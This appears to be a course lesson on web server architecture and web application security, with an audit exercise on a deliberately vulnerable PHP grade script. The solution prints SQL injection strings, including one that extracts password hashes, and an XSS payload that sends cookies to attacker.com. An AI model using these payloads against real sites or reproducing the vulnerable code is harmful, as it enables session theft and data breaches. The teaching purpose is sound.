# Lesson 3 — Web Server Architecture, Runtime Models & Security Engineering

> [!NOTE]
> **Learning Outcomes:**
> - Deconstruct the architectural evolution of web runtimes across the **Three Historical Models**: Static File Serving, Common Gateway Interface (CGI), and Modern Dynamic Application Servers.
> - Analyze the **C10K problem** and contrast the two dominant concurrency models: Multi-threaded / Process-Pool Worker Models (Apache, Gunicorn) vs. Non-Blocking Event-Driven Loops (Nginx, Node.js).
> - Establish the definitive engineering boundary between **Client-Side** and **Server-Side** execution, enforcing the foundational **Zero-Trust Rule** for distributed systems.
> - Audit and harden web applications against critical vulnerabilities: Information Leakage through verbose stack traces, Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), and SQL Injection (SQLi).
> - Apply Search Engine Optimization (SEO) fundamentals, HTTP security headers, and Core Web Vitals to production web architectures.

{{media:backend-architecture-video}}

{{media:webserver-evolution-diagram}}

---

## 1. The Mechanics of a Web Server

At its fundamental architectural level, a **Web Server** is a long-running daemon process that binds to a network socket, listens on a designated TCP port (e.g. port `80` or `443`), and processes incoming HTTP requests according to RFC specifications.

```
 [Client Socket] ──(TCP Handshake)──> [Server Listening Socket: Port 80/443]
                                                  │
                                                  ▼ (accept() syscall)
                                     [Dedicated Connection Socket]
                                                  │
                                                  ▼ (HTTP Parser)
                                     [Request Routing & Dispatch]
                                                  │
                                                  ▼ (File Read / Application Execution)
                                     [HTTP Response Generation]
                                                  │
                                                  ▼ (send() syscall)
 [Client Browser] <──(200 OK Body)───── [Network Interface Card (NIC)]
```

The underlying OS system-call lifecycle of a minimal POSIX web server:
1. `socket()`: Allocates an endpoint for network communication and returns a file descriptor.
2. `bind()`: Associates the socket with a specific local network interface IP address and TCP port number.
3. `listen()`: Marks the socket as passive, configuring a connection backlog queue for incoming connections.
4. `accept()`: Blocks until an incoming connection arrives, then extracts the first connection request on the queue and returns a **new dedicated connection socket file descriptor**.
5. `read()` / `recv()`: Ingests raw HTTP byte stream into an application buffer.
6. `write()` / `send()`: Transmits the HTTP response status, headers, and body back to the client.
7. `close()`: Terminates the socket (or leaves it open if `Connection: keep-alive` is negotiated).

---

## 2. The Evolution of Web Server Architectures: The Three Models

As business demands evolved from static text delivery to planet-scale transactional applications, web runtime architectures transitioned through three distinct technological eras.

```
 Model 1: Static Architecture    Model 2: CGI Scripts          Model 3: Modern Dynamic Engines
 [Client] ──> [Web Server]       [Client] ──> [Web Server]     [Client] ──> [Reverse Proxy]
                   │                               │                             │
                   ▼ (Direct Disk Read)            ▼ (fork() per request)        ▼ (Persistent Workers)
             [Disk Files]                   [CGI OS Process]              [App Server Pool / Event Loop]
```

### 2.1 Model 1: Static HTML Web Architecture (1991–1994)
In the original World Wide Web architecture, the web server operated purely as an automated remote file system browser:
- The client requests a resource: `GET /departments/software_engineering.html HTTP/1.1`.
- The web server maps the URL path directly to a root directory on the local storage disk (`/var/www/html/departments/software_engineering.html`).
- The server performs a `read()` system call and streams the raw bytes directly to the client socket.
- **Architectural Merits**: Ultra-low CPU utilization, microsecond response latencies, extreme cacheability at edge proxies and CDNs.
- **Fatal Limitation**: Zero personalization, no transactional capability, no dynamic database integration. Every change required manually editing HTML text on disk.

### 2.2 Model 2: Common Gateway Interface (CGI) Scripts (1993–1998)
To introduce dynamic computation, the National Center for Supercomputing Applications (NCSA) defined the **Common Gateway Interface (CGI 1.1)** specification (RFC 3875):
- The web server no longer reads a static file; instead, it executes an external executable binary or script (Perl, C, C++, Bourne Shell) located in a designated `/cgi-bin/` directory.
- **Parameter Passing**: The web server populates standard OS environment variables:
  - `REQUEST_METHOD` $\to$ `GET` or `POST`
  - `QUERY_STRING` $\to$ `search=algorithms&limit=10`
  - `CONTENT_LENGTH` $\to$ `48`
  - `HTTP_USER_AGENT` $\to$ `Mozilla/5.0...`
- **Data Flow**: If the request is a `POST`, the request body is piped into the script's **standard input (`stdin`)**. The script executes its business logic, queries a database, and writes its HTTP headers and HTML payload directly to **standard output (`stdout`)**, which the web server captures and forwards over the TCP socket.

#### The Fatal C10K Bottleneck of CGI
While CGI enabled dynamic computing, its process architecture suffered from catastrophic scalability constraints known as the **C10K Problem** (handling 10,000 concurrent connections):
- **Process Creation Overhead**: For *every single incoming HTTP request*, the web server was forced to invoke the OS `fork()` and `execve()` system calls.
- **Resource Saturation**: Spawning an OS process allocates dedicated page tables, file descriptor tables, execution stacks, and memory space. Under a modest spike of 1,000 concurrent requests, the operating system had to juggle 1,000 heavy processes, causing severe **CPU context switching trashing** and out-of-memory kernel panics.
- **Cold-Start Latency**: Every spawned CGI script had to independently establish a new, heavyweight TCP socket connection to the database server from scratch, execute its single query, and terminate.

### 2.3 Model 3: Modern Dynamic Application Servers & Persistent Runtimes
To overcome the CGI bottleneck, modern web engineering decoupled static asset delivery from dynamic application execution using **Persistent Worker Runtimes** and **Reverse Proxy Architectures**.

Instead of destroying the process after each request, application runtimes remain **permanently resident in memory**:
1. **Pre-Forked Worker Pools (Process-Based)**: Runtimes like **PHP-FPM**, Python **Gunicorn/uWSGI**, and Ruby **Puma** maintain a warm pool of pre-forked worker processes (e.g. 8 to 32 workers matching CPU cores). When a request finishes, the worker process does not exit; it immediately loops back to accept the next request from the queue.
2. **Database Connection Pooling**: Persistent application workers establish long-lived TCP connections to the database (e.g., PostgreSQL / MySQL) upon startup and reuse them across millions of subsequent requests, eliminating connection handshake latency.
3. **The Multi-Tier Reverse Proxy Architecture**:
   Modern enterprise web systems never expose dynamic application servers directly to the public Internet. Instead, an edge **Reverse Proxy** (such as Nginx, Envoy, or HAProxy) sits at the perimeter:

```
 [Public Internet]
        │
        ▼ (Port 443 HTTPS)
 +─────────────────────────────────────────────────────────────────────────+
 |                        Reverse Proxy (Nginx)                            |
 |  - Terminates TLS/SSL Encryption                                        |
 |  - Serves static assets (HTML/CSS/JS/Images) directly from OS disk cache|
 |  - Enforces rate limiting, DDoS filtering, and gzip/brotli compression  |
 +─────────────────────────────────────────────────────────────────────────+
        │
        ▼ (High-speed internal socket / HTTP reverse-proxy pass)
 +─────────────────────────────────────────────────────────────────────────+
 |                     Application Server (Django / Node.js)               |
 |  - Executes core business logic and REST APIs                           |
 |  - Interacts with Database and Cache tier via connection pools          |
 +─────────────────────────────────────────────────────────────────────────+
```

---

## 3. Concurrency Architectures: Thread Pools vs. Asynchronous Event Loops

Modern server software handles concurrent client connections through one of two primary architectural paradigms:

```
 Thread-Per-Connection (Apache / Tomcat)          Event-Driven Non-Blocking (Nginx / Node.js)
 ┌───────────────┐  ┌───────────────┐             ┌─────────────────────────────────────────┐
 │ Thread 1 (Req)│  │ Thread 2 (Req)│             │          Single Thread Event Loop       │
 │   BLOCKED ON  │  │   BLOCKED ON  │             │               (epoll / kqueue)          │
 │    DISK I/O   │  │    DB I/O     │             │ 1. Client Read Ready -> Parse           │
 └───────────────┘  └───────────────┘             │ 2. DB Query Ready    -> Emit Response   │
 (Memory: 2MB stack per thread;                   │ 3. Socket Writable   -> Flush Buffer    │
  Context switch overhead dominates)              └─────────────────────────────────────────┘
                                                  (Ultra-low memory; Handles 100k+ sockets)
```

| Concurrency Metric | Multi-Threaded / Worker Pool (e.g., Apache MPM Worker, Java Tomcat) | Event-Driven / Non-Blocking (e.g., Nginx, Node.js, Go Goroutines) |
| :--- | :--- | :--- |
| **Execution Model** | Dedicated OS thread per active connection. | Single (or few) threads running an event loop polling OS multiplexers (`epoll`). |
| **I/O Handling** | Synchronous Blocking I/O. The thread halts execution while waiting for disk or database reads. | Asynchronous Non-Blocking I/O. Socket delegates wait to OS kernel; thread immediately processes other tasks. |
| **Memory Footprint** | High (each OS thread typically allocates 1MB–8MB stack space; 10,000 threads = ~40GB RAM). | Minimal (a single event loop can maintain 50,000 idle socket descriptors in ~100MB RAM). |
| **Optimal Workload** | Heavy CPU-bound computation, image processing, complex financial calculations. | High-concurrency I/O-bound workloads (REST APIs, chat systems, WebSockets, proxying). |

---

## 4. The Engineering Boundary: Client-Side vs. Server-Side Execution

A software engineer must make architectural decisions regarding where code executes.

```
 +---------------------------------------------+---------------------------------------------+
 |                 Client-Side                 |                 Server-Side                 |
 +---------------------------------------------+---------------------------------------------+
 | Environment: User's Web Browser Engine      | Environment: Production Server / Cloud VPC  |
 | Runtimes: JavaScript (V8, SpiderMonkey)     | Runtimes: Python, Java, Go, C#, Node.js     |
 | Scope: DOM manipulation, UI responsiveness  | Scope: Persistence, Auth, Domain Invariants |
 | Security Posture: UNTRUSTED / HOSTILE       | Security Posture: TRUSTED / CONTROLLED      |
 +---------------------------------------------+---------------------------------------------+
```

### 4.1 Comparative Architectural Matrix

| Metric | Client-Side Computation | Server-Side Computation |
| :--- | :--- | :--- |
| **Latency & UX** | **Instantaneous**: Zero network round-trip. Instant UI updates, real-time input validation, optimistic client state rendering. | **Network Constrained**: Every operation requires minimum 1 RTT (typically 20ms–300ms depending on physical geography). |
| **Compute Cost** | **Zero server cost**: Utilizes the client device's CPU and GPU cycles (offloaded processing). | **Direct operational expense**: Requires cloud virtual machines, autoscaling groups, and database capacity. |
| **Source Integrity** | **Completely transparent**: All client-side JavaScript, CSS, and HTML can be inspected, modified, and reverse-engineered via browser DevTools. | **Protected intellectual property**: Proprietary algorithms, private keys, and database schemas remain hidden behind firewalls. |
| **Security Authority** | **Zero Authority**: Any validation running in the browser can be bypassed by an attacker using `curl`, Postman, or memory injection. | **Definitive Authority**: The single source of truth. Enforces business rules, access control, and cryptographic invariants. |

> [!CAUTION]
> **The Golden Rule of Distributed Web Engineering:**
> *Never trust client-side validation for security or domain integrity.* Client-side validation is strictly an ergonomic user-experience optimization (saving users from waiting for an error page). The server must re-validate, sanitize, and verify every single incoming byte independently.

---

## 5. Web Application Security Engineering

According to industry reports and the **OWASP (Open Web Application Security Project) Top 10**, vulnerabilities stem from improper handling of untrusted input and architectural misconfigurations.

### 5.1 Information Leakage & Verbose Error Handling
As highlighted in course lectures, a rampant production vulnerability is leaking internal system internals through unhandled debug traces:

```
❌ VULNERABLE PRODUCTION ERROR RESPONSE:
HTTP/1.1 500 Internal Server Error
Content-Type: text/html

Traceback (most recent call last):
  File "/var/www/portal/students/views.py", line 42, in get_grades
    db_conn = psycopg2.connect("dbname=aastu_prod user=postgres password=secret host=10.0.4.15")
  File "/usr/local/lib/python3.11/psycopg2/__init__.py", line 122, in connect
psycopg2.OperationalError: FATAL: password authentication failed for user "postgres"
```

*Vulnerability Impact*: The attacker learns:
1. The exact operating system file path structure (`/var/www/portal/...`).
2. The specific programming language and library versions (`python3.11`, `psycopg2`).
3. The internal private network IP of the database server (`10.0.4.15`).
4. The database username (`postgres`).

```
✅ SECURE PRODUCTION ERROR RESPONSE:
HTTP/1.1 500 Internal Server Error
Content-Type: application/json

{
  "error": "InternalServerError",
  "message": "An unexpected error occurred while processing your request.",
  "incident_id": "err_98f1bc42a"
}
```
*Architectural Pattern*: Log full diagnostic traces and credentials exclusively to secure, private, centralized logging backends (e.g. Datadog, ELK stack) tagged with a unique `incident_id`. Expose only the sanitized opaque reference ID to the client.

### 5.2 Core Vulnerability Triad: XSS, CSRF, and SQL Injection

```
 +-----------------------------------------------------------------------------------------+
 | Vulnerability | Threat Vector                         | Architectural Defense           |
 +---------------+---------------------------------------+---------------------------------+
 | **XSS**       | Attacker injects malicious JavaScript | Context-aware HTML escaping;    |
 | (Cross-Site   | into pages viewed by other users,     | Content Security Policy (CSP);  |
 |  Scripting)   | stealing session tokens.              | Set `HttpOnly` on auth cookies. |
 +---------------+---------------------------------------+---------------------------------+
 | **CSRF**      | Unauthorized commands are transmitted | Anti-CSRF Synchronizer Tokens;  |
 | (Cross-Site   | from a trusted user browser to a site | SameSite=Strict cookie policy;  |
 |  Req Forgery) | where the user is authenticated.      | Custom request headers (JWT).   |
 +---------------+---------------------------------------+---------------------------------+
 | **SQLi**      | Malicious SQL fragments injected into | Parameterized Prepared Queries; |
 | (SQL          | input fields alter query logic,       | Object-Relational Mappers (ORM);|
 |  Injection)   | exfiltrating entire databases.        | Principle of Least Privilege.   |
 +---------------+---------------------------------------+---------------------------------+
```

#### SQL Injection Defense Demonstration:
```python
# ❌ CATASTROPHICALLY VULNERABLE: Direct string concatenation
def authenticate(username, password):
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    cursor.execute(query) # Attacker input: admin' -- results in WHERE username = 'admin' --'

# ✅ SECURE: Parameterized prepared statements
def authenticate(username, password):
    query = "SELECT id, password_hash FROM users WHERE username = %s"
    cursor.execute(query, (username,)) # SQL engine treats parameter purely as literal data!
```

---

## 6. Web Standards, SEO & Production Engineering

High-performing web applications must adhere to web standards for accessibility, machine discoverability (**SEO**), and browser rendering performance:

1. **Semantic HTML5 Architecture**: Using descriptive landmarks (`<header>`, `<nav>`, `<main>`, `<article>`, `<section>`, `<footer>`) instead of generic unsemantic `<div>` soup. Enables screen readers for visually impaired users and guides search engine crawlers.
2. **Search Engine Optimization (SEO) Foundations**:
   - Unique, descriptive `<title>` tags and `<meta name="description">` on every route.
   - Machine directives: `/robots.txt` regulating crawler access; `/sitemap.xml` listing authoritative URLs.
   - Social metadata: Open Graph protocol (`<meta property="og:title">`) for rich link unfurls.
3. **Core Web Vitals Performance Targets**:
   - **Largest Contentful Paint (LCP)**: Time taken to render the primary above-the-fold content block (Target: $< 2.5\text{s}$).
   - **Interaction to Next Paint (INP)**: Responsiveness to user input clicks and taps (Target: $< 200\text{ms}$).
   - **Cumulative Layout Shift (CLS)**: Visual stability preventing elements from jumping as images load (Target: $< 0.1$).

---

## 7. Progressive Engineering Practice (3-Tier)

### Level 1: Architectural Trace — Request Dispatch in a Modern Web Stack
Trace the physical path of an HTTP `POST` request to `https://portal.aastu.edu.et/api/v1/enrollment` as it traverses a production 3-tier reverse-proxy architecture:

```
[Browser] ──(1)──> [Cloudflare CDN] ──(2)──> [Nginx Reverse Proxy] ──(3)──> [Gunicorn Worker] ──(4)──> [PostgreSQL]
```

**Step-by-Step Architectural Execution:**
1. **Edge CDN (Cloudflare)**: Resolves Anycast DNS; inspects incoming traffic against Web Application Firewall (WAF) rules; checks if target URL matches a cached edge representation. For dynamic `POST`, bypasses cache and proxies to origin IP.
2. **Nginx Perimeter Proxy**:
   - Terminates TLS/SSL connection (decrypts incoming ciphertext).
   - Validates client request wire format (enforces `client_max_body_size 10M`).
   - Forwards request over internal UNIX domain socket (`/run/gunicorn.sock`) or private LAN IP via `proxy_pass http://gunicorn_upstream`.
3. **Application Server (Gunicorn / Django)**:
   - Assigns request to an available worker thread/process.
   - Executes middleware pipeline: Security middleware, Session middleware, CSRF token validation, Authentication middleware.
   - Dispatches request to the URL routing controller, executing the business logic in the view function.
4. **Database Tier (PostgreSQL)**:
   - Worker checks out a pre-allocated connection from the internal connection pool.
   - Executes parameterized `INSERT INTO enrollments ...` within an ACID transaction block.
   - Commits transaction; worker releases connection back to pool and serializes response JSON.
   - Nginx receives upstream bytes, applies gzip/brotli compression, and writes encrypted TLS frames back over the client socket.

---

### Level 2: Scaffolded Security Audit — Remediating Legacy Script Vulnerabilities
> **Scenario:** You are conducting a security audit of a legacy PHP university grade-checking script running on an internal server:
> ```php
> <?php
> ini_set('display_errors', 1);
> error_reporting(E_ALL);
> 
> $student_id = $_GET['id'];
> $conn = new mysqli("localhost", "root", "rootpass123", "university_db");
> 
> if ($conn->connect_error) {
>     die("Database connection failed: " . $conn->connect_error);
> }
> 
> $sql = "SELECT full_name, gpa, major FROM students WHERE id = '$student_id'";
> $result = $conn->query($sql);
> 
> if ($result->num_rows > 0) {
>     $row = $result->fetch_assoc();
>     echo "<h1>Student Profile: " . $row['full_name'] . "</h1>";
>     echo "<p>Major: " . $row['major'] . "</p>";
>     echo "<p>Cumulative GPA: " . $row['gpa'] . "</p>";
> } else {
>     echo "No record found for student query: " . $student_id;
> }
> ?>
> ```
> 
> Identify the **four major security vulnerabilities** in this script and refactor it into production-hardened PHP code.

<details>
<summary>Click to view solution & analysis</summary>

#### Vulnerabilities Identified:
1. **Critical SQL Injection (SQLi)**: `$student_id` is directly interpolated into the SQL string without sanitation. An attacker passing `id=' OR '1'='1` will dump the first record, or `id=' UNION SELECT username, password_hash, 'admin' FROM users --` will extract password hashes.
2. **Reflected Cross-Site Scripting (XSS)**: In the failure branch, `$_GET['id']` is printed directly into HTML (`echo "...: " . $student_id;`). Passing `id=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>` executes arbitrary script in the victim's browser session.
3. **Critical Information Disclosure**: `display_errors` is enabled, and connection errors are dumped directly to standard output (`die("Database connection failed: " . $conn->connect_error)`), leaking database engine details and host configuration upon failure.
4. **Hardcoded Root Credentials**: Cleartext database credentials (`root / rootpass123`) are hardcoded in application source code instead of injected via environment variables.

#### Production-Hardened Refactoring:
```php
<?php
// 1. Disable client-facing error display; log to secure private file
ini_set('display_errors', 0);
ini_set('log_errors', 1);
error_reporting(E_ALL);

// 2. Ingest credentials from secure environment variables
$db_host = getenv('DB_HOST') ?: '127.0.0.1';
$db_user = getenv('DB_USER');
$db_pass = getenv('DB_PASS');
$db_name = getenv('DB_NAME') ?: 'university_db';

// 3. Strict input validation
$student_id = filter_input(INPUT_GET, 'id', FILTER_DEFAULT);
if (!$student_id || !preg_match('/^[A-Za-z0-9\/_-]+$/', $student_id)) {
    http_response_code(400);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(['error' => 'Invalid or missing student identifier format.']);
    exit;
}

try {
    mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
    $conn = new mysqli($db_host, $db_user, $db_pass, $db_name);
    $conn->set_charset("utf8mb4");

    // 4. Parameterized Prepared Statement (Guarantees immunity against SQLi)
    $stmt = $conn->prepare("SELECT full_name, gpa, major FROM students WHERE id = ?");
    $stmt->bind_param("s", $student_id);
    $stmt->execute();
    $result = $stmt->get_result();

    if ($row = $result->fetch_assoc()) {
        header('Content-Type: text/html; charset=utf-8');
        // 5. Context-aware HTML Escaping against XSS
        $safe_name = htmlspecialchars($row['full_name'], ENT_QUOTES | ENT_HTML5, 'UTF-8');
        $safe_major = htmlspecialchars($row['major'], ENT_QUOTES | ENT_HTML5, 'UTF-8');
        $safe_gpa = htmlspecialchars((string)$row['gpa'], ENT_QUOTES | ENT_HTML5, 'UTF-8');

        echo "<h1>Student Profile: " . $safe_name . "</h1>";
        echo "<p>Major: " . $safe_major . "</p>";
        echo "<p>Cumulative GPA: " . $safe_gpa . "</p>";
    } else {
        http_response_code(404);
        header('Content-Type: text/html; charset=utf-8');
        $safe_id = htmlspecialchars($student_id, ENT_QUOTES | ENT_HTML5, 'UTF-8');
        echo "<p>No record found for student query: " . $safe_id . "</p>";
    }

    $stmt->close();
    $conn->close();
} catch (Throwable $e) {
    // 6. Generic sanitized client error + private logging
    error_log("Database error in student query: " . $e->getMessage());
    http_response_code(500);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(['error' => 'An internal database error occurred. Please contact system support.']);
    exit;
}
?>
```

</details>

---

### Level 3: Advanced System Design — High-Concurrency Web Portal Architecture
> **Scenario:** You are appointed Chief Architect for the National University Entrance Examination portal. 
> On result release morning, **250,000 students** will hit `https://results.moe.gov.et/` simultaneously to check their matriculation scores within a 15-minute window (peak: **35,000 HTTP requests per second**).
> The primary database cluster cannot withstand more than 2,000 read queries per second.
> 
> Architect an end-to-end web system architecture incorporating caching, edge delivery, and computation boundaries that guarantees 100% uptime with sub-second response times.

<details>
<summary>Click to view architectural solution</summary>

#### High-Scale Architectural Blueprint:

```
 [250,000 Concurrent Students]
               │
               ▼ (HTTPS DNS Anycast)
 [Global Edge CDN Tier: Cloudflare / Fastly]
    ├── Static Assets (HTML/CSS/JS): Served directly from Edge Cache (Hit Ratio: 99.9%)
    └── Result Query: GET /api/v1/result?id=ET102450
               │
               ▼ (Origin Shield / Nginx Reverse Proxy Tier: 6 Load Balancers)
 [Nginx Reverse Proxy Tier]
               │
               ▼ (Microservices Pool: 20 Stateless Go / Rust Worker Instances)
 [Stateless API Workers]
               │
               ├── (1. Check In-Memory Cache) ──> [Distributed Redis Cluster (32GB, 3 Replicas)]
               │                                   - Cache Hit (98% of repeated queries): ~1ms latency!
               │                                   - Pre-warmed with entire student dataset prior to 08:00 AM!
               │
               └── (2. Cache Miss Fallback) ────> [Read-Only Database Replicas]
                                                   (Max read load capped safely under 500 QPS)
```

#### Key Architectural Implementations:
1. **Pre-Warming the In-Memory Cache**:
   - Examination scores are immutable on release day.
   - At 06:00 AM (2 hours before release), a batch script extracts all 250,000 student records from PostgreSQL, serializes them into compact JSON strings, and loads them into a **Redis In-Memory Key-Value Cluster** keyed by student roll number (`student:ET102450`).
   - During the rush, **0% of result lookups touch the relational database**. The Go API workers read directly from RAM in under 0.8 milliseconds.
2. **Edge CDN Caching with Micro-Caching**:
   - The API response includes the HTTP header:
     ```http
     Cache-Control: public, max-age=60, stale-while-revalidate=30
     ```
   - If a student frantically refreshes their browser 20 times in 10 seconds, only the first request reaches the origin. The subsequent 19 requests are absorbed directly by the CDN edge server closest to their mobile tower.
3. **Static Single Page Application (SPA) Decoupling**:
   - The user interface is a pre-compiled static bundle (HTML, CSS, JS) hosted entirely on Amazon S3 / Cloudflare Pages.
   - The origin server does not render a single HTML page; it serves exclusively lightweight JSON payloads, keeping server CPU consumption under 25%.

</details>
